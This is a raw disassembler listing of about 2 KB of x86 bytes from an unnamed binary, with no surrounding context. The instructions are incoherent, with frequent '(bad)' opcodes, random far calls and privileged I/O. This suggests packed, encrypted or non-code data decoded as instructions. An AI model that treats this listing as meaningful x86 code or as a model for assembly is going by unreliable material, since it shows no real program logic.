  415694:	inc    ecx
  415695:	xor    bh,cl
  415697:	call   0x74b:0x61710d84
  41569e:	dec    esi
  41569f:	add    ah,BYTE PTR [ebx+eiz*2]
  4156a2:	iret   
  4156a3:	(bad)  
  4156a4:	sbb    eax,0x16825098
  4156a9:	fldenv [edx]
  4156ab:	sbb    DWORD PTR [eax+0x23c0726a],0x7bc85058
  4156b5:	int3   
  4156b6:	dec    ecx
  4156b7:	mov    cl,0xf3
  4156b9:	pop    edi
  4156ba:	dec    edi
  4156bb:	push   es
  4156bc:	inc    esi
  4156bd:	cs scas al,BYTE PTR es:[edi]
  4156bf:	jle    0x415668
  4156c1:	scas   eax,DWORD PTR es:[edi]
  4156c2:	xchg   DWORD PTR [ecx],ebp
  4156c4:	mov    esp,0x196f93ec
  4156c9:	ret    
  4156ca:	call   0xe67:0x87ab1523
  4156d1:	lock cdq 
  4156d3:	pushf  
  4156d4:	mov    bl,0x44
  4156d6:	aaa    
  4156d7:	push   ds
  4156d8:	jle    0x415665
  4156da:	lea    edx,es:[edx+ecx*2+0x49]
  4156df:	ret    0x8d0
  4156e2:	cmp    eax,0xa4621acf
  4156e7:	scas   eax,DWORD PTR es:[edi]
  4156e8:	sub    DWORD PTR [edx-0x7e],ebp
  4156eb:	ins    BYTE PTR es:[edi],dx
  4156ec:	stos   DWORD PTR es:[edi],eax
  4156ed:	cmp    al,BYTE PTR [edi]
  4156ef:	push   ebx
  4156f0:	adc    DWORD PTR [edi],ebp
  4156f2:	or     DWORD PTR [ecx-0x2df68e78],edx
  4156f8:	shl    bh,cl
  4156fa:	lea    edx,[ecx]
  4156fc:	fcmovbe st,st(3)
  4156fe:	icebp  
  4156ff:	xor    DWORD PTR [esi+0x29],0xffffff86
  415703:	add    edi,edi
  415705:	enter  0x52ac,0x6
  415709:	ja     0x4156bf
  41570b:	jecxz  0x415741
  41570d:	xchg   esi,eax
  41570e:	ins    BYTE PTR es:[edi],dx
  41570f:	retf   
  415710:	lods   al,BYTE PTR ds:[esi]
  415711:	gs mov al,0x69
  415714:	xor    ah,cl
  415716:	mov    dh,0xd4
  415718:	aaa    
  415719:	stc    
  41571a:	shr    BYTE PTR [ebp+edx*4+0x35],0xba
  41571f:	or     eax,0x8b8f834e
  415724:	inc    esi
  415725:	enter  0x4ca7,0xeb
  415729:	in     al,0x7b
  41572b:	xlat   BYTE PTR ds:[ebx]
  41572c:	push   esi
  41572d:	xor    eax,0xfeb3365
  415732:	mov    ecx,0x21feec39
  415737:	push   edi
  415738:	mov    bh,0xf4
  41573a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41573b:	pusha  
  41573c:	sub    al,0x70
  41573e:	and    al,0x94
  415740:	mov    ebx,0x922f7b16
  415745:	xor    DWORD PTR [ebx+0x7],esp
  415748:	mov    eax,ds:0x6faeb80c
  41574d:	push   esi
  41574e:	push   cs
  41574f:	retf   0xe510
  415752:	inc    ecx
  415753:	imul   edi,DWORD PTR [ecx+0x27],0x25
  415757:	lahf   
  415758:	call   0x1601e44f
  41575d:	nop
  41575e:	adc    dl,cl
  415760:	das    
  415761:	js     0x415714
  415763:	mov    ebp,0x722ba275
  415768:	mov    ecx,0xce77217
  41576d:	call   0xa5d8:0x39f79eb1
  415774:	lods   eax,DWORD PTR ds:[esi]
  415775:	test   al,0x1f
  415777:	xchg   ecx,ecx
  415779:	stos   BYTE PTR es:[edi],al
  41577a:	sti    
  41577b:	push   cs
  41577c:	rcr    DWORD PTR [ecx-0x3d12712e],cl
  415782:	stos   BYTE PTR es:[edi],al
  415783:	dec    edx
  415784:	pop    edi
  415785:	mov    ebp,?
  415787:	fwait
  415788:	mov    ebx,0x8302b4b8
  41578d:	ror    DWORD PTR [ebx+0x42],cl
  415790:	sbb    DWORD PTR [esp+esi*1-0x63],edx
  415794:	scas   al,BYTE PTR es:[edi]
  415795:	scas   al,BYTE PTR es:[edi]
  415796:	int3   
  415797:	or     ch,BYTE PTR [ebp+eax*2-0x2e47bdeb]
  41579e:	push   es
  41579f:	fwait
  4157a0:	mov    edi,0x85fbdcac
  4157a5:	cmp    bl,ch
  4157a7:	adc    al,0xef
  4157a9:	or     DWORD PTR [ebp+ebp*2-0x162ec451],ebp
  4157b0:	sub    BYTE PTR [edi+ebx*8],ah
  4157b3:	loop   0x415745
  4157b5:	pop    edi
  4157b6:	sbb    eax,0xeffc5f2
  4157bb:	mov    eax,0x3567af72
  4157c0:	hlt    
  4157c1:	mov    ecx,0xe03fc939
  4157c6:	enter  0x1caf,0x5
  4157ca:	ins    BYTE PTR es:[edi],dx
  4157cb:	sbb    BYTE PTR [ebp+ebp*2+0x7a13ac40],dh
  4157d2:	es push ds
  4157d4:	loopne 0x4157ee
  4157d6:	aas    
  4157d7:	sub    DWORD PTR ds:0x70f03013,esp
  4157dd:	xchg   esp,eax
  4157de:	jno    0x415802
  4157e0:	xor    BYTE PTR gs:[eax+eiz*2-0x6b478d93],bh
  4157e8:	into   
  4157e9:	xor    bl,BYTE PTR [esi-0x44769681]
  4157ef:	test   al,0xe2
  4157f1:	lods   eax,DWORD PTR ds:[esi]
  4157f2:	(bad)  
  4157f3:	shl    BYTE PTR [esi-0x6a98431a],0x89
  4157fa:	dec    esi
  4157fb:	enter  0x4d73,0xa4
  4157ff:	dec    ebp
  415800:	add    di,dx
  415803:	mov    eax,0x5a64ce70
  415808:	mov    al,ds:0xe41956
  41580d:	out    dx,eax
  41580e:	lods   al,BYTE PTR ds:[esi]
  41580f:	gs js  0xc49fd052
  415816:	call   0x91c9:0x798861ab
  41581d:	sub    ebp,ebx
  41581f:	aas    
  415820:	mov    ebx,0xc09c8499
  415825:	int    0x73
  415827:	enter  0x8959,0xad
  41582b:	sub    al,0xba
  41582d:	push   cs
  41582e:	xchg   DWORD PTR [eax-0x17b41d82],esp
  415834:	add    DWORD PTR [edi],esp
  415836:	xor    al,0x28
  415838:	mov    ebx,edi
  41583a:	aad    0x92
  41583c:	pop    edx
  41583d:	ss popf 
  41583f:	enter  0x6c0e,0xa4
  415843:	sub    DWORD PTR [esi-0x49ba370d],0xffffffc2
  41584a:	imul   edi,DWORD PTR [ebp-0x143ace1c],0x5657efc
  415854:	arpl   WORD PTR [ecx-0x18b957eb],si
  41585a:	cmp    DWORD PTR [ebp+0x76de9c78],ebx
  415860:	not    dh
  415862:	(bad)  
  415863:	or     BYTE PTR ds:0xe4bf0716,bh
  415869:	idiv   BYTE PTR [edx+0xe]
  41586c:	xchg   ebp,eax
  41586d:	shl    ah,0x27
  415870:	or     al,0x3
  415872:	mov    ds:0x34024d47,eax
  415877:	or     dl,BYTE PTR [ebp-0x28]
  41587a:	mov    edi,0xb6e88c94
  41587f:	int3   
  415880:	repz mov eax,esp
  415883:	cmp    BYTE PTR [eax+0x5d551176],ah
  415889:	inc    ebp
  41588a:	sub    BYTE PTR [eax],bh
  41588c:	inc    ebx
  41588d:	push   edi
  41588e:	inc    esi
  41588f:	repnz pop ds
  415891:	call   0xaf93dbb9
  415896:	mov    ecx,0xc19a3c3c
  41589b:	fs mov ebx,0x48d25015
  4158a1:	adc    bl,BYTE PTR [edx+0x25a8b042]
  4158a7:	xor    BYTE PTR [esi],0x3
  4158aa:	test   eax,0x96a0f399
  4158af:	test   BYTE PTR [ebx-0x7e],dl
  4158b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158b3:	out    0x4d,al
  4158b5:	push   0xffffffff
  4158b7:	sbb    eax,DWORD PTR [esi+0x0]
  4158ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158bb:	xchg   edi,eax
  4158bc:	push   ebp
  4158bd:	push   ds
  4158be:	xor    BYTE PTR ds:0x4a90a592,0xce
  4158c5:	pop    ss
  4158c6:	in     eax,dx
  4158c7:	pusha  
  4158c8:	leave  
  4158c9:	mov    al,cs:0x3c999f0
  4158cf:	pop    edx
  4158d0:	push   esp
  4158d1:	cld    
  4158d2:	cs daa 
  4158d4:	xchg   ecx,eax
  4158d5:	sbb    al,0xb2
  4158d7:	sbb    BYTE PTR [ebx+ecx*1+0x717533dc],ah
  4158de:	adc    ah,BYTE PTR [ebx*8+0x5138a4a0]
  4158e5:	test   BYTE PTR [ebx+0x4a02cce],ch
  4158eb:	push   ebx
  4158ec:	or     eax,0x9f191e54
  4158f1:	ficomp DWORD PTR [eax+0x3a9571f1]
  4158f7:	jmp    0xa2fb51b1
  4158fc:	mov    ah,cl
  4158fe:	sbb    DWORD PTR ds:[esi+0x50],ecx
  415902:	call   0x8844:0x5d8a3900
  415909:	pop    ss
  41590a:	mov    ds:0x30d9f7dc,eax
  41590f:	cdq    
  415910:	xchg   edi,eax
  415911:	mov    BYTE PTR [ebx],cl
  415913:	out    0x9,eax
  415915:	bound  ebp,QWORD PTR [eax-0x7688763a]
  41591b:	jmp    0xba51:0xaed59dda
  415922:	adc    al,0x68
  415924:	stos   DWORD PTR es:[edi],eax
  415925:	dec    ebp
  415926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415927:	cli    
  415928:	lea    ebp,[eax]
  41592a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41592b:	fnstenv [eax]
  41592d:	dec    esi
  41592e:	lods   al,BYTE PTR ds:[esi]
  41592f:	dec    ecx
  415930:	sbb    BYTE PTR [ecx],0x43
  415933:	sti    
  415934:	xchg   BYTE PTR [eax-0x43f4dd53],cl
  41593a:	les    esp,FWORD PTR [ebp+0x33]
  41593d:	cs out 0x7c,eax
  415940:	or     eax,0x94c8e89d
  415945:	add    ebx,DWORD PTR [ebx-0x5c]
  415948:	ja     0x4159b0
  41594a:	dec    edi
  41594b:	push   ds
  41594c:	dec    ebx
  41594d:	add    eax,0xfe76bbf7
  415953:	scas   al,BYTE PTR es:[edi]
  415954:	jnp    0x415928
  415956:	cmp    al,0x30
  415958:	and    eax,0x326e17da
  41595d:	int    0x8d
  41595f:	mov    bl,0xe0
  415961:	pop    eax
  415962:	dec    edx
  415963:	adc    bh,BYTE PTR [ecx+0x76b76a6b]
  415969:	push   esi
  41596a:	ins    BYTE PTR es:[edi],dx
  41596b:	sti    
  41596c:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41596e:	xlat   BYTE PTR ds:[ebx]
  41596f:	mov    edi,0x497fbe44
  415974:	mov    edi,0x67cf5c16
  415979:	outs   dx,DWORD PTR ds:[esi]
  41597a:	inc    DWORD PTR [edx+ecx*4+0xb]
  41597e:	test   eax,0xdf27cf61
  415983:	xor    eax,0x4761dd7b
  415988:	cmp    DWORD PTR [ebp-0x15d77620],eax
  41598e:	bound  edx,QWORD PTR [ecx-0x42]
  415991:	(bad)  
  415992:	outs   dx,DWORD PTR ds:[esi]
  415993:	dec    eax
  415994:	pop    edx
  415995:	fld    QWORD PTR [edx+0xe686ab3]
  41599b:	clc    
  41599c:	pop    ds
  41599d:	dec    esi
  41599e:	enter  0xf230,0x62
  4159a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159a3:	in     al,dx
  4159a4:	idiv   BYTE PTR [edi-0x5192db6e]
  4159aa:	out    dx,eax
  4159ab:	jle    0x41597e
  4159ad:	pushf  
  4159ae:	mov    ds:0xa8131d4e,eax
  4159b3:	push   edx
  4159b4:	int    0xc9
  4159b6:	loop   0x415a07
  4159b8:	lock loopne 0x41594d
  4159bb:	jbe    0x4159cc
  4159bd:	lds    edi,FWORD PTR [edx-0x20]
  4159c0:	int3   
  4159c1:	add    edx,esp
  4159c3:	xor    DWORD PTR [edi-0x35],ebx
  4159c6:	icebp  
  4159c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159c8:	xlat   BYTE PTR ds:[ebx]
  4159c9:	and    DWORD PTR [ebx+eiz*4],ecx
  4159cc:	push   edx
  4159cd:	inc    ebp
  4159ce:	call   0xec41:0x3ba00b9b
  4159d5:	cld    
  4159d6:	mov    bh,0xb9
  4159d8:	dec    esi
  4159d9:	sbb    eax,0xc34e8538
  4159de:	mov    al,ds:0x163e0f11
  4159e3:	push   esp
  4159e4:	inc    esi
  4159e5:	lock outs dx,DWORD PTR ds:[esi]
  4159e7:	cmp    DWORD PTR [edx-0x44],0xffffffb9
  4159eb:	mov    esi,0x340527da
  4159f0:	inc    ah
  4159f2:	shr    DWORD PTR ds:[eax-0x37],cl
  4159f6:	or     eax,0x3c5497e5
  4159fb:	push   ss
  4159fc:	ret    0x9248
  4159ff:	call   0x343e69f2
  415a04:	mov    eax,ds:0x53057618
  415a09:	jle    0x4159a8
  415a0b:	add    DWORD PTR [ebx-0x3afe51be],edx
  415a11:	aaa    
  415a12:	adc    edx,eax
  415a14:	pop    edx
  415a15:	add    eax,0x5a6c284b
  415a1a:	or     al,0x3c
  415a1c:	ret    0x9538
  415a1f:	jle    0x415a61
  415a21:	jno    0x4159bd
  415a23:	test   BYTE PTR [ebx+0x223a4a46],ch
  415a29:	ins    DWORD PTR es:[edi],dx
  415a2a:	cmp    BYTE PTR [eax+eiz*4],cl
  415a2d:	mov    WORD PTR [ebx-0x5a],es
  415a30:	xchg   esi,eax
  415a31:	dec    ebx
  415a32:	ds test al,0x4d
  415a35:	cmp    bh,0xbb
  415a38:	retf   
  415a39:	mov    al,0x4e
  415a3b:	mov    eax,0x51c78f51
  415a40:	lods   eax,DWORD PTR ds:[esi]
  415a41:	sti    
  415a42:	xor    ch,BYTE PTR [esi]
  415a44:	jbe    0x415a10
  415a46:	std    
  415a47:	inc    esi
  415a48:	loopne 0x4159ef
  415a4a:	xchg   esi,eax
  415a4b:	scas   al,BYTE PTR es:[edi]
  415a4c:	loope  0x415a4c
  415a4e:	mov    ch,0xba
  415a50:	enter  0x87da,0xbf
  415a54:	inc    edx
  415a55:	sahf   
  415a56:	inc    ecx
  415a57:	mov    esi,0xae998548
  415a5c:	jg     0x415a7a
  415a5e:	retf   
  415a5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a60:	scas   al,BYTE PTR es:[edi]
  415a61:	mov    ah,0x3
  415a63:	aas    
  415a64:	cmp    eax,0x7082c914
  415a69:	popa   
  415a6a:	ret    0xf6a0
  415a6d:	pop    edx
  415a6e:	sbb    dh,BYTE PTR [ebx+0x15591357]
  415a74:	jo     0x415a39
  415a76:	stos   DWORD PTR es:[edi],eax
  415a77:	adc    bh,cl
  415a79:	pop    ebp
  415a7a:	cwde   
  415a7b:	mov    esi,0x29bf5304
  415a80:	clc    
  415a81:	adc    eax,0x970981b4
  415a86:	xchg   edx,eax
  415a87:	sub    edi,DWORD PTR [esi-0x20efdd1c]
  415a8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a8e:	stos   BYTE PTR es:[edi],al
  415a8f:	inc    ebx
  415a90:	pop    ss
  415a91:	nop
  415a92:	rol    BYTE PTR [ecx-0x7f062e0c],1
  415a98:	sub    DWORD PTR [ecx+edi*2-0x4b],edx
  415a9c:	loope  0x415aa7
  415a9e:	and    edx,DWORD PTR [ebx]
  415aa0:	sub    al,0x91
  415aa2:	fstp   DWORD PTR [esi]
  415aa4:	popa   
  415aa5:	dec    ebp
  415aa6:	outs   dx,BYTE PTR ds:[esi]
  415aa7:	cmp    al,0x9a
  415aa9:	inc    ebx
  415aaa:	sbb    DWORD PTR [ecx-0xd],ecx
  415aad:	ins    BYTE PTR es:[edi],dx
  415aae:	dec    ebx
  415aaf:	pop    esi
  415ab0:	mov    esi,0x7f54b95b
  415ab5:	test   al,0x90
  415ab7:	cmp    eax,0x600602f0
  415abc:	fcomip st,st(1)
  415abe:	es aam 0x5d
  415ac1:	imul   DWORD PTR [ebx+0x4]
  415ac4:	and    edi,DWORD PTR [ebx-0x46]
  415ac7:	xchg   ebp,eax
  415ac8:	push   ds
  415ac9:	lods   al,BYTE PTR ds:[esi]
  415aca:	sbb    eax,0xca705a39
  415acf:	ret    0xf1a5
  415ad2:	fidiv  DWORD PTR [esi]
  415ad4:	adc    dh,BYTE PTR [eax+edi*2+0x49]
  415ad8:	xchg   ebp,eax
  415ad9:	mov    ecx,0x1d538887
  415ade:	mov    ebp,0xb6a74a4b
  415ae3:	(bad)  
  415ae4:	dec    edi
  415ae5:	adc    BYTE PTR [ecx],bh
  415ae7:	in     al,dx
  415ae8:	shl    DWORD PTR [ebp+0x8e8752f],cl
  415aee:	das    
  415aef:	rcl    DWORD PTR [ebp*8-0x515f29e4],0x66
  415af7:	and    ch,BYTE PTR [ebx+0x78c72900]
  415afd:	cmp    ecx,DWORD PTR ds:0x5626d00c
  415b03:	aam    0xd1
  415b05:	rcr    DWORD PTR [eax-0x3fbae547],1
  415b0b:	cwde   
  415b0c:	adc    BYTE PTR [esi+0x5330cf0a],bl
  415b12:	fldcw  WORD PTR [edi+ecx*1+0x64784f20]
  415b19:	dec    eax
  415b1a:	aaa    
  415b1b:	mov    ebx,0xc08da058
  415b20:	jmp    0x47b7cb61
  415b25:	pusha  
  415b26:	xchg   edi,eax
  415b27:	sub    al,0x9
  415b29:	jmp    0x6436:0x7bcca1d0
  415b30:	mov    esp,0x95112e9c
  415b35:	mov    bh,0xbf
  415b37:	ja     0x415ac2
  415b39:	mov    dh,0x88
  415b3b:	in     eax,0x14
  415b3d:	xchg   bp,ax
  415b3f:	aas    
  415b40:	mov    DWORD PTR [eax],edx
  415b42:	outs   dx,DWORD PTR ds:[esi]
  415b43:	(bad)
  415b46:	mov    ebx,0xbc6cb088
  415b4b:	js     0xbc53e711
  415b51:	ds sub al,0x2d
  415b54:	push   ss
  415b55:	cs mov ebx,0xf9013f4
  415b5b:	mov    esi,0x5ce9a048
  415b60:	pop    esp
  415b61:	cdq    
  415b62:	fcomp  st(7)
  415b64:	adc    al,0x88
  415b66:	adc    BYTE PTR [eax],bl
  415b68:	popf   
  415b69:	push   edx
  415b6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b6b:	pop    ebx
  415b6c:	mov    esi,0x1a6f254
  415b71:	adc    ch,bh
  415b73:	sbb    eax,0xaaf8fd94
  415b78:	pop    ecx
  415b79:	rol    BYTE PTR [edx-0x6d],cl
  415b7c:	jge    0x415b21
  415b7e:	cdq    
  415b7f:	xchg   esi,eax
  415b80:	nop
  415b81:	pop    esp
  415b82:	mov    WORD PTR [ecx-0x3a],ss
  415b85:	js     0x415bc0
  415b87:	cmp    eax,0xc3eeb8be
  415b8c:	jmp    0x56fd:0xea0f525d
  415b93:	les    edi,FWORD PTR [ebp+edx*8+0x2c]
  415b97:	mov    bh,BYTE PTR [ebp-0x37b3e76]
  415b9d:	js     0x415bca
  415b9f:	fs inc edi
  415ba1:	(bad)
  415ba6:	aas    
  415ba7:	repz or DWORD PTR fs:[edi-0x52],ecx
  415bac:	jno    0x415bc7
  415bae:	xchg   dl,ah
  415bb0:	mov    ds:0x37fed717,al
  415bb5:	pushf  
  415bb6:	clc    
  415bb7:	or     DWORD PTR [ebp+0x7df2e8c1],0xffffff85
  415bbe:	mov    ds:0xd71fe92e,al
  415bc3:	test   ebp,ecx
  415bc5:	pop    ecx
  415bc6:	pop    esi
  415bc7:	inc    eax
  415bc8:	pop    eax
  415bc9:	dec    edi
  415bca:	fwait
  415bcb:	cmc    
  415bcc:	stc    
  415bcd:	push   edi
  415bce:	pop    ecx
  415bcf:	(bad)  
  415bd0:	fsubr  DWORD PTR [esi+0x1d35bff5]
  415bd6:	loope  0x415be9
  415bd8:	xor    ah,dl
  415bda:	das    
  415bdb:	retf   
  415bdc:	repnz push ebx
  415bde:	(bad)  
  415be0:	and    ah,cl
  415be2:	sbb    esi,edx
  415be4:	ss pop edx
  415be6:	fbstp  TBYTE PTR [ecx]
  415be8:	outs   dx,DWORD PTR ds:[esi]
  415be9:	jge    0x415c20
  415beb:	fmul   QWORD PTR [esi+0x7a]
  415bee:	adc    dl,BYTE PTR [ebx]
  415bf0:	lea    ecx,[ebp-0x27e06371]
  415bf6:	out    0xd5,al
  415bf8:	mov    cl,0x9e
  415bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bfb:	dec    ebx
  415bfc:	outs   dx,DWORD PTR ds:[esi]
  415bfd:	mov    bh,al
  415bff:	xor    ch,dl
  415c01:	mov    dl,0xf1
  415c03:	out    0xf1,eax
  415c05:	and    BYTE PTR [ecx-0x6a],0x78
  415c09:	ins    BYTE PTR es:[edi],dx
  415c0a:	js     0x415c4d
  415c0c:	daa    
  415c0d:	scas   eax,DWORD PTR es:[edi]
  415c0e:	mov    bl,0x28
  415c10:	jae    0x415c57
  415c12:	and    eax,0xcb934eed
  415c17:	mov    al,0x87
  415c19:	jbe    0x415bfd
  415c1b:	mov    dl,0x79
  415c1d:	sub    ecx,DWORD PTR [ecx+ecx*8+0x32]
  415c21:	in     al,0x8a
  415c23:	ret    0xa3b3
  415c26:	push   edi
  415c27:	ret    0xdff9
  415c2a:	cmc    
  415c2b:	js     0x415c5d
  415c2d:	popa   
  415c2e:	xchg   BYTE PTR [ebx-0x26b3a05c],bh
  415c34:	pop    ds
  415c35:	xor    BYTE PTR [eax+0x1b224fc9],bh
  415c3b:	lds    esi,FWORD PTR [edx]
  415c3d:	fistp  QWORD PTR [ebp-0x39]
  415c40:	add    BYTE PTR [ebx-0x28140bdc],bl
  415c46:	push   cs
  415c47:	sub    al,0xe9
  415c49:	lock pop esp
  415c4b:	adc    esi,ecx
  415c4d:	push   eax
  415c4e:	cli    
  415c4f:	pusha  
  415c50:	retf   
  415c51:	add    eax,0x337d2277
  415c56:	es dec edx
  415c58:	pushf  
  415c59:	int3   
  415c5a:	inc    edi
  415c5b:	sub    al,0xdf
  415c5d:	mov    dh,0x5c
  415c5f:	sub    al,al
  415c61:	scas   al,BYTE PTR es:[edi]
  415c62:	jmp    0xabb6b568
  415c67:	mov    edx,0x28c9bd2c
  415c6c:	mov    gs,WORD PTR [ecx]
  415c6e:	inc    ebp
  415c6f:	imul   ebp,DWORD PTR [ebp-0x62],0x40
  415c73:	jg     0x415cac
  415c75:	in     eax,0x6e
  415c77:	push   cs
  415c78:	fistp  DWORD PTR [edx+0x260a42f9]
  415c7e:	pop    ds
  415c7f:	int3   
  415c80:	ins    DWORD PTR es:[edi],dx
  415c81:	test   BYTE PTR [esi],al
  415c83:	cld    
  415c84:	inc    edx
  415c85:	sub    eax,0x44482c
  415c8a:	fsubr  DWORD PTR [edx+ecx*8]
  415c8d:	popa   
  415c8e:	enter  0xf8c5,0xd3
  415c92:	dec    eax
  415c93:	shl    DWORD PTR [edx+0x46f3fa7f],0xee
  415c9a:	xor    DWORD PTR [ecx+ebp*4+0x7413b6f9],ebx
  415ca1:	out    dx,eax
  415ca2:	mov    dl,0xa2
  415ca4:	sbb    eax,0xc2385a03
  415ca9:	mov    ebp,0x31d82a35
  415cae:	fisttp DWORD PTR [edx+0x1bc22089]
  415cb4:	xchg   edi,eax
  415cb5:	pop    esp
  415cb6:	xor    eax,0xc9073395
  415cbb:	xor    dh,bl
  415cbd:	jle    0x415c8e
  415cbf:	push   ebp
  415cc0:	je     0x415cc4
  415cc2:	pop    ds
  415cc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cc4:	push   ebp
  415cc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cc6:	xor    BYTE PTR [esi-0x5722a58a],ah
  415ccc:	inc    edi
  415ccd:	mov    ch,0x51
  415ccf:	(bad)  [edx-0x32]
  415cd2:	dec    ecx
  415cd3:	or     DWORD PTR ds:0xc7723e0e,ecx
  415cd9:	fimul  WORD PTR [edx]
  415cdb:	adc    ebp,esp
  415cdd:	push   ds
  415cde:	out    0x65,al
  415ce0:	and    al,0x61
  415ce2:	xor    dh,ch
  415ce4:	or     al,0x26
  415ce6:	iret   
  415ce7:	ins    DWORD PTR es:[edi],dx
  415ce8:	fld    TBYTE PTR [ecx-0xcd3a566]
  415cee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cef:	inc    ecx
  415cf0:	jbe    0x415d67
  415cf2:	pop    ds
  415cf3:	push   ebx
  415cf4:	frstor [ecx+0x60]
  415cf7:	das    
  415cf8:	ror    DWORD PTR [ebp-0x389a20f],cl
  415cfe:	xchg   esp,eax
  415cff:	xor    eax,0xc4038aab
  415d04:	xchg   esp,eax
  415d05:	push   eax
  415d06:	add    dh,BYTE PTR [ebp+0x13a80dea]
  415d0c:	les    edx,FWORD PTR [ebx-0x74e035da]
  415d12:	fs stos DWORD PTR es:[edi],eax
  415d14:	pop    ecx
  415d15:	pshufw mm5,QWORD PTR [esi-0x4df6d429],0x3f
  415d1d:	jae    0x415d8d
  415d1f:	div    BYTE PTR [esi+edi*2+0x52]
  415d23:	or     edx,DWORD PTR [edx+ebp*8+0x11]
  415d27:	inc    esi
  415d28:	pop    edi
  415d29:	int3   
  415d2a:	xchg   ebp,eax
  415d2b:	sub    BYTE PTR [esi+0x529f24bf],bl
  415d31:	out    dx,eax
  415d32:	push   ecx
  415d33:	and    eax,0x6caf8789
  415d38:	pop    edx
  415d39:	xchg   DWORD PTR [esi+0x63],esp
  415d3c:	sub    dh,dh
  415d3e:	jg     0x415d3c
  415d40:	and    eax,DWORD PTR [ebp+ecx*8-0x1c338a5a]
  415d47:	inc    ecx
  415d48:	in     eax,0xe3
  415d4a:	lods   al,BYTE PTR ds:[esi]
  415d4b:	das    
  415d4c:	and    DWORD PTR [ecx-0x583f3474],0x78
  415d53:	xchg   edi,eax
  415d54:	jl     0x415d1e
  415d56:	inc    eax
  415d57:	push   cs
  415d58:	add    BYTE PTR [ebx-0x7c843b8f],cl
  415d5e:	dec    ebp
  415d5f:	sbb    ch,bh
  415d61:	adc    edi,DWORD PTR [eax]
  415d63:	mov    bl,bl
  415d65:	call   0xb38f01a5
  415d6a:	add    al,0x72
  415d6c:	push   esp
  415d6d:	add    al,0x81
  415d6f:	int3   
  415d70:	push   ds
  415d71:	push   edi
  415d72:	pop    eax
  415d73:	sar    BYTE PTR [eax+0x47],cl
  415d76:	push   esi
  415d77:	clc    
  415d78:	lock push ss
  415d7a:	xor    BYTE PTR [ecx+eax*2-0x6fc1632d],dh
  415d81:	push   edx
  415d82:	mov    al,ds:0x57241971
  415d87:	ss div BYTE PTR cs:[ebx+0x397f3aa2]
  415d8f:	mov    es,WORD PTR fs:[eax+0x20]
  415d93:	pop    es
  415d94:	out    0xae,al
  415d96:	ror    DWORD PTR [ecx],0x22
  415d99:	xor    DWORD PTR [esi],edx
  415d9b:	in     eax,dx
  415d9c:	add    BYTE PTR [ebx+0x17307d3],cl
  415da2:	sub    eax,0xc6ea1a88
  415da7:	data16 mov bh,0x89
  415daa:	fsubr  DWORD PTR [edi-0x42]
  415dad:	test   DWORD PTR [edi-0x1c8e59f],ecx
  415db3:	dec    eax
  415db4:	jl     0x415e0e
  415db6:	(bad)  
  415db7:	scas   eax,DWORD PTR es:[edi]
  415db8:	push   ebx
  415db9:	sub    al,0x49
  415dbb:	pop    eax
  415dbc:	ss loopne 0x415d5f
  415dbf:	fidiv  DWORD PTR [edx+0x3e]
  415dc2:	hlt    
  415dc3:	out    dx,al
  415dc4:	inc    DWORD PTR [ecx]
  415dc6:	sub    eax,0xe3a7f24e
  415dcb:	aas    
  415dcc:	in     al,dx
  415dcd:	cs into 
  415dcf:	jmp    0x15c1:0x8cf057a1
  415dd6:	ins    BYTE PTR es:[edi],dx
  415dd7:	add    DWORD PTR [ecx-0x5a],0xa6f5aff8
  415dde:	mov    edx,0xbf0eefee
  415de3:	into   
  415de4:	scas   al,BYTE PTR es:[edi]
  415de5:	aad    0x79
  415de7:	jmp    FWORD PTR [esi+0x17]
  415dea:	inc    ebx
  415deb:	mov    esp,?
  415ded:	push   eax
  415dee:	pop    esi
  415def:	loopne 0x415dcd
  415df1:	and    DWORD PTR [eax+ebp*8],0x34
  415df5:	cld    
  415df6:	dec    ebx
  415df7:	mov    edx,0xc255eb39
  415dfc:	loopne 0x415e36
  415dfe:	sub    DWORD PTR [edx],edx
  415e00:	xchg   DWORD PTR [ecx],esp
  415e02:	xchg   DWORD PTR [eax-0x24],ebx
  415e05:	iret   
  415e06:	mov    ah,BYTE PTR [ebx-0x2f]
  415e09:	lock popf 
  415e0b:	sub    DWORD PTR [esi-0x6fb76daa],0x1a8a9498
  415e15:	outs   dx,DWORD PTR gs:[esi]
  415e17:	sti    
  415e18:	repnz loop 0x415de4
  415e1b:	mov    BYTE PTR [esi-0x11],al
  415e1e:	rcl    edi,cl
  415e20:	adc    al,0xc5
  415e22:	jecxz  0x415e33
  415e24:	(bad)  
  415e25:	in     al,0x21
  415e27:	mov    eax,0xb076e1ca
  415e2c:	cmp    eax,0x2d545f72
  415e31:	inc    edi
  415e32:	mov    ebx,0x772996fa
  415e37:	or     BYTE PTR [eax+0x54],bh
  415e3a:	dec    eax
  415e3b:	into   
  415e3c:	ror    dl,1
  415e3e:	leave  
  415e3f:	fstp   QWORD PTR [esi+0x19c8eb13]
  415e45:	stc    
  415e46:	adc    eax,0xbb8fe3b1
  415e4b:	xchg   edx,eax
  415e4c:	gs dec ecx
  415e4e:	xor    al,0xda
  415e50:	sbb    eax,0x9d05ffef
  415e55:	xor    cl,dl
  415e57:	and    ebx,edx
  415e59:	int    0xa
  415e5b:	aam    0xa7
  415e5d:	dec    edi
  415e5e:	mov    esi,0x1a7cf79f
  415e63:	ja     0x415eb8
  415e65:	dec    esi
  415e66:	ficomp DWORD PTR gs:[edi-0x56]
  415e6a:	jmp    0x415e66
  415e6c:	icebp  
  415e6d:	fsubr  DWORD PTR [ebp-0x14b0888c]
  415e73:	(bad)  
  415e74:	cli    
  415e75:	js     0x415ec2
  415e77:	xor    al,0xd5
  415e79:	call   0xb7ebfc3a
  415e7e:	popf   
